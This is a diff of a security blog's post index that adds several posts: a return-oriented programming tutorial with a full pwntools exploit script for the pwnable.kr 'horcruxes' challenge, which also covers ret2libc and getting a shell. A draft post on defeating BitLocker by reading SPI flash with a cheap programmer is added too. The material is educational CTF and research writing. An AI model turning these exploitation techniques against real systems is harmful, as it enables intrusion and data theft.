@@ -128,6 +128,53 @@
     
          
     
+      <li class="post-item" data-content="Bypassing NX and DEPSo lets talk about ROP, virtually every compiler nowadays secures programs by adding NX and DEP attributes which means the memory is either writable or executable but never both. You can’t just inject shellcode onto the stack and have it executed, it will just kill the process.This should have in theory ended stack based exploitation but it didn’t.
+How ROP Works Under the HoodHere’s the thing, you don’t need to execute new code. The binary and it’s libraries already have tons of executable code that we are able to use to our advantage.In the epilogue of each procedure we will always see something like this:
+123mov esp, ebppop ebp ; both lines substituted as &#x27;leave&#x27; instruction on x64ret
+The first two lines just clear up the local variables and restore the stack frame for the caller.Now ret is the key instruction for ROP, you can think of it as sort of an abstraction for:
+1mov eip, [esp]
+Normally this would contain the address of where this procedure was originally called so program execution continues as intended, but the CPU doesn’t really care if the address in eip belongs to the caller or not - it just goes there.If you control the stack, you control where every ret goes. That’s the foundation of ROP.
+So What’s a Gadget Chain?A gadget is any sequence of instructions that ends in ret. They’re just snippets of existing code scattered across the binary and it’s libraries.ROP chains work by overflowing a vulnerable function with arbitrary addresses so once the first gadget executes and hits it’s own ret, that instruction just pops off the next address we’ve provided in the chain and jumps to it. Each gadget’s ret becomes the bridge to the next gadget, you’re basically just hijacking the return mechanism to manipulate the control flow of the program.
+Practical ROP ChainingA great example for this type of exploitation technique is the Horcruxes challenge from pwnable.kr, although this isn’t really a writeup I’ll try to do my best to explain how this challenge goes.For the sake of demonstartion the binary had PIE disabled so addresses would remain static and we could just copy them into our exploit.
+1234checksec --file=horcruxesRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILEFull RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols	  No	0		3		horcruxes
+The binary initializes seven functions A-G with each of them storing a random value, and we need them sum of all these integers to receive the flag. However we cannot see those integers during regular execution since they are generated at runtime so we’ll need to jump to each of the seven functions one after the other to print them out (see where we’re going?).Another interesting point to clear up: why couldn’t we just use the first gadget to jump to where the flag is printed?The challenge’s author has accounted for this, and all addresses inside the ropme function contain a 0a which converts into a newline, stopping the puts function which relies on newlines to figure out where the end of a string is.
+The VulnerabilityLooking at the disassembly, the ropme function has a classic buffer overflow via gets():
+1call   0x8041080 &lt;gets@plt&gt;
+No bounds checking, no canary. We can overflow straight into the saved return address.Now all we have to do is find the addresses (remember, no PIE!) of all the functions from A to G and create a chain that does the following:
+
+First things first - fills up the buffer(116) allocated for the gets() function plus saved ebp(4).
+Overflow with our address chain of the A-G functions.
+Add the address of where ropme is called from main, since we cannot jump to inside that function.
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from ctypes import c_intelf = ELF(&quot;./horcruxes&quot;)p = elf.process()horcruxes = [    0x0804129d,    0x080412cf,    0x08041301,    0x08041333,    0x08041365,    0x08041397,    0x080413c9,]ropme = 0x080414fcexp = 0p.recvuntil(b&quot;Menu:&quot;)p.sendline(b&quot;123&quot;)p.recvuntil(b&quot;earned? : &quot;)payload = b&quot;A&quot;*116payload += b&quot;B&quot;*4for addr in horcruxes:    payload += p32(addr)payload += p32(ropme)p.sendline(payload)for _ in range(7):    p.recvuntil(b&quot;+&quot;)    tmp = p.recvuntil(b&quot;)&quot;, drop=True)    exp += int(tmp)log.info(&quot;EXP sum: &quot; + str(c_int(exp).value))p.recvuntil(b&quot;Menu:&quot;)p.sendline(b&quot;123&quot;)p.recvuntil(b&quot;earned? : &quot;)p.sendline(str(c_int(exp).value).encode())p.interactive()
+When ropme hits ret the chain begins starting at A, all the way to G, and back to ropme. Each function prints the random value, then we parse and sum handling the integer overflow. Submitting the sum back at the binary prints out the flag.
+ROP WeaponizationIn the this challenge ROP was used primarily for control flow manipulation to leak values, but its real potential lies in achieving code execution. In real-world exploitation, ROP is the primary technique for bypassing Data Execution Prevention (DEP&#x2F;NX) and obtaining a shell. Here are two common routes for ROP weaponization:
+
+ret2libc&#x2F;direct call: use resolved libc addresses to call system(&quot;/bin/sh&quot;), execve, or other libc helpers. Fast and compact when libc is known or leakable.
+Full ROP payloads: when you need more control, build a gadget chain to write strings into .bss, set up registers, and call mprotect/mmap or syscalls to change memory permissions or invoke execve directly. Stack pivot to a larger controlled buffer if the saved-return slot is too small.
+
+Whether you’re writing code or breaking it understanding how ret works, how the stack controls execution, and how code boundaries are really just conventions-that knowledge makes you better at your job. Because security isn’t about what code is supposed to do. It’s about what code can do when someone controls inputs you didn’t expect them to control.
+">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2025-10-05T00:00:00.000Z" class="dt-published" itemprop="datePublished">05-10-2025</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/blog/2025/10/05/rop/">Return Oriented Programming: Exploitation Without Execution</a>
+    
+
+
+</span>
+        <span class="reading-time"></span>
+      </li>
+    
       <li class="post-item" data-content="Poking at Chinese FirmwareI recently spent some time reversing a pre-historic smart device as a research exercise. While poking at the firmware binaries I stumbled on a bug inside how the device parses the config XML file.The vendor hasn’t issued a statement yet(shocker) so I will try to the best of my ability to recreate a similar vulnerable function without accidentally disclosing any real detail that can be used to identify the device.
 Understanding XML: Structure Without SafetyXML (eXtensible Markup Language) is a markup language that uses a hierarchical structure of elements enclosed in angle brackets.Think of XML as a structuring system where information gets organized into labeled elements that can hold both data and other elements.
 1234&lt;device&gt;	&lt;name&gt;Generic Router&lt;/name&gt;	&lt;firmware_version&gt;2.1&lt;/firmware_version&gt;&lt;/device&gt;
@@ -177,7 +224,16 @@ This example was a significant oversimplification of how IoT&#x2F;smart home dev
         <span class="reading-time"></span>
       </li>
     
-      <li class="post-item" data-content="work in progress 🤫">
+      <li class="post-item" data-content="work in progress 🤫Honestly the only reason I got into this rabbit hole is having an old laptop lying around and wondered how far I can stretch the line without bricking it entirely. In particular to see how disk encryption actually works under the hood and trying to break it by clipping some cheap hardware hacking tools from AliExpress like a CH341A.
+Special thanks to Xeno Kovah and OpenSecurityTraining2 for sparking my curiosity and providing some incredible quality material.
+BitLocker 101: Keys, TPMs, and CryptographyLets walk through how BitLocker is supposed to work, because the more you understand the elegant design, the more the real world flaws start to make sense.BitLocker represents Microsoft’s attempt to solve a genuinely hard problem: how do you automatically decrypt a hard drive when an authorized user boots their computer, but keep it locked when an unauthorized person tries to access the data?
+The solution relies on a “trusted boot” process. Think of it as a chain of cryptographic measurements that starts with your computer’s firmware and continues through each piece of software that loads during startup. Each component hashes the next, creating a unique fingerprint of your system’s exact boot state.
+It does so by using what’s called a Trusted Platform Module(TPM) chip, which only hands over the keys once the measured state matches the same state as when Bitlocker was first configured on the machine. If anything significant has changed in the boot process the TPM chip will not transfer the keys and may require a Bitlocker recovery process.
+This measurement process creates what’s called a “root of trust” but like any chain, it’s only as strong as its weakest link. The TPM measures each component, but it has to trust that the measurements it receives are valid, and this is where the elegance starts to show cracks.
+When your computer boots, the UEFI&#x2F;BIOS firmware is the first code to run, responsible for measuring itself and the next component in the chain. But here’s the catch: the UEFI firmware lives in SPI flash memory which is a small chip that’s often easily accessible on the motherboard and wasn’t designed with sophisticated tamper protection in mind.
+Exercise! Try looking at an old motherboard or any PCB you have lying around and find a small 8-legged chip and do a short google search on the text that’s written on it, most chip vendors provide an open source datasheet
+This is where a cheap flash programmer comes into play, it can directly read and write to SPI flash chips containing the sealed BitLocker keys or parameters used to derive them. The irony is that BitLocker’s strength its tight integration with the hardware boot process also creates its most exploitable weakness. Every piece of the trusted boot chain becomes a potential attack surface for someone with physical access.
+">
         
     <div class="meta">
       
